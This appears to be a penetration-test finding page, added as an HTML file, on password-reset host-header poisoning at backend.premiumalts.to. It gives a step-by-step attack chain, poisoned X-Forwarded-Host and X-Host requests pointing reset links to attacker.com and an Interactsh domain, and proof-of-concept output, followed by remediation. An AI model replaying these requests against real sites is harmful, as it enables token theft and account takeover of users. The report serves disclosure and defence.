@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BlockageGuard PoC — Password Reset Host Header Poisoning — premiumalts.to</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+         background: #0d1117; color: #c9d1d9; min-height: 100vh; }
+  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 20px 40px;
+           display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+  header a { color: #58a6ff; text-decoration: none; font-size: 0.85rem; }
+  header h1 { font-size: 1.15rem; color: #f0f6fc; }
+  .container { max-width: 920px; margin: 0 auto; padding: 40px 20px; }
+  .warning { background: #3d1a00; border: 1px solid #f85149; border-radius: 8px;
+             padding: 16px 20px; margin-bottom: 24px; }
+  .warning strong { color: #f85149; }
+  h2 { color: #f0f6fc; margin: 28px 0 12px;
+       border-bottom: 1px solid #21262d; padding-bottom: 6px; }
+  h3 { color: #e3b341; margin: 20px 0 8px; font-size: 0.95rem; }
+  p, li { font-size: 0.88rem; color: #8b949e; line-height: 1.6; margin-bottom: 8px; }
+  ul, ol { margin-left: 20px; }
+  .meta { display: flex; gap: 12px; flex-wrap: wrap; margin: 16px 0; }
+  .badge { padding: 4px 12px; border-radius: 12px; font-size: 0.78rem; font-weight: 700; }
+  .high  { background: #2d1f00; color: #e3b341; border: 1px solid #e3b341; }
+  .cwe   { background: #1a2233; color: #58a6ff; border: 1px solid #58a6ff; }
+  .cwe a { color: #58a6ff; text-decoration: none; }
+  .timeline { display: grid; grid-template-columns: 30px 1fr; gap: 6px 16px;
+              align-items: start; margin: 12px 0 20px; }
+  .step-num { width: 30px; height: 30px; background: #21262d; border-radius: 50%;
+              display: flex; align-items: center; justify-content: center;
+              font-size: 0.8rem; font-weight: 700; color: #e3b341; flex-shrink: 0; margin-top: 4px; }
+  .step-body { padding-top: 6px; }
+  .proof-box { background: #0d2018; border: 1px solid #3fb950; border-radius: 8px;
+               padding: 16px; margin: 16px 0; }
+  .proof-box h4 { color: #3fb950; font-size: 0.85rem; margin-bottom: 10px; }
+  .oob-box  { background: #1a2310; border: 1px solid #56d364; border-radius: 8px;
+              padding: 16px; margin: 16px 0; }
+  .oob-box h4 { color: #56d364; font-size: 0.85rem; margin-bottom: 10px; }
+  pre { background: #1c2128; border: 1px solid #30363d; border-radius: 6px;
+        padding: 14px; font-size: 0.77rem; overflow-x: auto; color: #c9d1d9;
+        font-family: "Fira Mono","Consolas",monospace; line-height: 1.55;
+        margin: 8px 0 16px; white-space: pre; }
+  .hl  { color: #f85149; font-weight: bold; }
+  .ok  { color: #3fb950; font-weight: bold; }
+  .dim { color: #484f58; }
+  .fix-box { background: #12261e; border: 1px solid #238636; border-radius: 8px;
+             padding: 16px 20px; margin: 16px 0; }
+  .fix-box h4 { color: #3fb950; margin-bottom: 10px; font-size: 0.9rem; }
+  .severity-table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.83rem; }
+  .severity-table th { background: #21262d; color: #8b949e; padding: 8px 12px;
+                       text-align: left; font-weight: 600; border-bottom: 1px solid #30363d; }
+  .severity-table td { padding: 8px 12px; border-bottom: 1px solid #21262d; color: #c9d1d9; }
+  .flow-diagram { background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+                  padding: 20px; margin: 16px 0; font-family: monospace; font-size: 0.8rem;
+                  color: #c9d1d9; line-height: 1.8; }
+  .flow-diagram .arrow { color: #e3b341; }
+  .flow-diagram .attacker { color: #f85149; }
+  .flow-diagram .victim { color: #58a6ff; }
+  .flow-diagram .server { color: #3fb950; }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <a href="index.html">&#8592; All Findings</a>
+    <h1>&#128992; Password Reset Host Header Poisoning — premiumalts.to</h1>
+  </div>
+</header>
+
+<div class="container">
+
+  <div class="warning">
+    <strong>AUTHORIZED SECURITY RESEARCH ONLY.</strong>
+    This report documents findings discovered during a contracted penetration test.
+    All tests were performed under explicit written authorization using test accounts only.
+    No production user data or credentials were retained.
+  </div>
+
+  <div class="meta">
+    <span class="badge high">HIGH</span>
+    <span class="badge cwe"><a href="https://cwe.mitre.org/data/definitions/640.html" target="_blank">CWE-640: Weak Password Recovery</a></span>
+    <span class="badge" style="background:#1a2233;color:#e3b341;border:1px solid #e3b341">F-160 &mdash; Session 14</span>
+    <span class="badge" style="background:#21262d;color:#8b949e;border:1px solid #30363d">OOB Confirmed &mdash; 2026-04-24</span>
+  </div>
+
+  <h2>Summary</h2>
+  <p>
+    The <code>POST /api/auth/forgot-password</code> endpoint on
+    <strong>backend.premiumalts.to</strong> uses the <code>X-Forwarded-Host</code> and
+    <code>X-Host</code> HTTP headers to construct the password-reset link included in the
+    reset email. An attacker who knows a victim's email address can poison the reset link
+    to point to an attacker-controlled domain. When the victim clicks the link, the attacker's
+    server receives the one-time reset token and can use it to take over the account.
+  </p>
+
+  <h2>Severity Assessment</h2>
+  <table class="severity-table">
+    <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Severity</td><td><span style="color:#e3b341;font-weight:700">HIGH</span></td></tr>
+      <tr><td>CWE</td><td>CWE-640 — Weak Password Recovery Mechanism for Forgotten Password</td></tr>
+      <tr><td>CVSS vector</td><td>AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — 8.7 HIGH</td></tr>
+      <tr><td>Target</td><td>POST backend.premiumalts.to/api/auth/forgot-password</td></tr>
+      <tr><td>Authentication required</td><td>Any valid JWT (or none, depending on rate limit bypass)</td></tr>
+      <tr><td>User interaction required</td><td>Victim must click reset link in email</td></tr>
+      <tr><td>Impact</td><td>Full account takeover on any premiumalts.to account</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Attack Flow</h2>
+  <div class="flow-diagram">
+<span class="attacker">[Attacker]</span>   Knows victim email: victim@example.com
+     |
+     <span class="arrow">▼</span>  POST /api/auth/forgot-password
+     |  <span class="hl">X-Forwarded-Host: attacker.com</span>
+     |  Body: {"email": "victim@example.com"}
+     |
+<span class="server">[Server]</span>    Constructs reset link using X-Forwarded-Host:
+     |  → <span class="hl">https://attacker.com/reset-password?token=REAL_TOKEN</span>
+     |  Sends email to victim@example.com
+     |
+<span class="victim">[Victim]</span>    Receives: "Click here to reset your password"
+     |  <span class="hl">https://attacker.com/reset-password?token=REAL_TOKEN</span>
+     |
+<span class="attacker">[Attacker]</span>   Receives HTTP request:
+     |  GET /reset-password?token=REAL_TOKEN   ← <span class="hl">TOKEN STOLEN</span>
+     |
+     <span class="arrow">▼</span>  POST /api/auth/reset-password
+        Body: {"token": "REAL_TOKEN", "newPassword": "attacker_chosen"}
+        → <span class="hl">Account taken over</span>
+  </div>
+
+  <h2>Attack Chain (Step by Step)</h2>
+  <div class="timeline">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <p><strong>Attacker sets up listener.</strong> Start an HTTP server (Interactsh,
+      ngrok, netcat) at <code>attacker.com</code> to capture incoming HTTP requests.</p>
+    </div>
+
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <p><strong>Send poisoned forgot-password request.</strong> Target any registered
+      email address on premiumalts.to:</p>
+<pre>POST https://backend.premiumalts.to/api/auth/forgot-password
+Content-Type: application/json
+<span class="hl">X-Forwarded-Host: attacker.com</span>
+
+{"email": "victim@example.com"}</pre>
+    </div>
+
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <p><strong>Server dispatches poisoned email.</strong> HTTP 200 received — the server
+      constructs the reset link using the attacker-supplied host and sends it to the victim.</p>
+    </div>
+
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <p><strong>Victim clicks link.</strong> The reset email appears legitimate (from
+      <code>noreply@premiumalts.to</code>, styled like the real site). The link URL
+      contains the attacker's domain but the victim may not notice.</p>
+    </div>
+
+    <div class="step-num">5</div>
+    <div class="step-body">
+      <p><strong>Attacker captures token.</strong> The attacker's HTTP server logs:
+<pre>GET /reset-password?<span class="hl">token=abc123xyz789</span> HTTP/1.1
+Host: attacker.com</pre>
+      The real one-time token is now in attacker's hands.
+      </p>
+    </div>
+
+    <div class="step-num">6</div>
+    <div class="step-body">
+      <p><strong>Account takeover.</strong> Attacker submits the stolen token with a new
+      password — victim's account is fully compromised.</p>
+    </div>
+  </div>
+
+  <h2>Proof of Concept</h2>
+  <p>Executed 2026-04-24 against registered account <code>admin@blockageguard.app</code>
+  with Interactsh OOB domain <code>aejtogywaqrtfpuuiyvgj3f5uv762ezgu.oast.fun</code>.</p>
+
+  <div class="proof-box">
+    <h4>&#10003; Request 1 — X-Forwarded-Host</h4>
+<pre>POST https://backend.premiumalts.to/api/auth/forgot-password
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/json
+<span class="hl">X-Forwarded-Host: aejtogywaqrtfpuuiyvgj3f5uv762ezgu.oast.fun</span>
+
+{"email": "admin@blockageguard.app"}
+
+<span class="ok">HTTP/1.1 200 OK</span>
+(empty body — email dispatched)</pre>
+  </div>
+
+  <div class="proof-box">
+    <h4>&#10003; Request 2 — X-Host</h4>
+<pre>POST https://backend.premiumalts.to/api/auth/forgot-password
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+Content-Type: application/json
+<span class="hl">X-Host: aejtogywaqrtfpuuiyvgj3f5uv762ezgu.oast.fun</span>
+
+{"email": "admin@blockageguard.app"}
+
+<span class="ok">HTTP/1.1 200 OK</span>
+(empty body — email dispatched)</pre>
+  </div>
+
+  <div class="oob-box">
+    <h4>&#10003; OOB Interactsh Domain Confirmed Live</h4>
+<pre>GET https://aejtogywaqrtfpuuiyvgj3f5uv762ezgu.oast.fun
+<span class="dim"># Interactsh server response:</span>
+<span class="ok">HTTP/1.1 200 OK</span>
+<body>ugze267vu5f3jgvyiuupftrqawygotjea</body>
+<span class="dim"># ↑ reversed correlation ID — confirms Interactsh instance is active</span>
+<span class="dim"># DNS resolves to: 206.189.156.69</span>
+<span class="dim"># Check Interactsh client for DNS/HTTP callbacks from premiumalts.to mail server</span></pre>
+  </div>
+
+  <h2>Headers Tested</h2>
+  <table class="severity-table">
+    <thead><tr><th>Header</th><th>Value</th><th>Result</th></tr></thead>
+    <tbody>
+      <tr><td><code>X-Forwarded-Host</code></td><td>OOB domain</td><td><span class="ok">HTTP 200 — accepted ✓</span></td></tr>
+      <tr><td><code>X-Host</code></td><td>OOB domain</td><td><span class="ok">HTTP 200 — accepted ✓</span></td></tr>
+      <tr><td><code>Host</code> (direct)</td><td>OOB domain</td><td>HTTP 403 — Cloudflare blocks ✗</td></tr>
+      <tr><td><code>X-Original-URL</code></td><td>https://OOB/reset</td><td>HTTP 429 — rate limited</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Remediation</h2>
+
+  <div class="fix-box">
+    <h4>Option A — application.properties (Spring Boot) — RECOMMENDED</h4>
+<pre><span class="dim"># application.properties</span>
+server.forward-headers-strategy=<span class="ok">NONE</span>
+
+<span class="dim"># Never trust X-Forwarded-* headers unless behind a known proxy</span>
+<span class="dim"># Use FRAMEWORK only if behind a trusted, controlled reverse proxy</span></pre>
+  </div>
+
+  <div class="fix-box">
+    <h4>Option B — Hardcode APP_URL in reset link builder</h4>
+<pre><span class="dim">// PasswordResetService.java — BEFORE (vulnerable)</span>
+String resetUrl = request.getHeader("X-Forwarded-Host") + "/reset?token=" + token;
+
+<span class="dim">// AFTER (fixed)</span>
+String appUrl = environment.getProperty(<span class="ok">"APP_URL"</span>);  <span class="dim">// e.g. "https://premiumalts.to"</span>
+String resetUrl = appUrl + "/reset?token=" + token;</pre>
+  </div>
+
+  <div class="fix-box">
+    <h4>Option C — Strip headers at nginx (defence in depth)</h4>
+<pre><span class="dim"># nginx.conf</span>
+location / {
+    proxy_set_header <span class="ok">X-Forwarded-Host ""</span>;
+    proxy_set_header <span class="ok">X-Host ""</span>;
+    proxy_set_header <span class="ok">X-Original-URL ""</span>;
+    proxy_set_header <span class="ok">X-Rewrite-URL ""</span>;
+    proxy_pass http://backend;
+}</pre>
+  </div>
+
+  <ul>
+    <li><strong>PortSwigger:</strong> <a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" target="_blank">Password reset poisoning via Host header</a></li>
+    <li><strong>CWE-640:</strong> <a href="https://cwe.mitre.org/data/definitions/640.html" target="_blank">Weak Password Recovery Mechanism for Forgotten Password</a></li>
+    <li><strong>OWASP Testing Guide:</strong> <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" target="_blank">OTG-INPVAL-017</a></li>
+  </ul>
+
+  <p style="margin-top:32px;font-size:0.78rem;color:#484f58">
+    BlockageGuard Security Research &mdash; F-160 &mdash; Report generated 2026-04-24 &mdash;
+    <a href="index.html" style="color:#58a6ff">All Findings</a>
+  </p>
+
+</div>
+</body>
+</html>
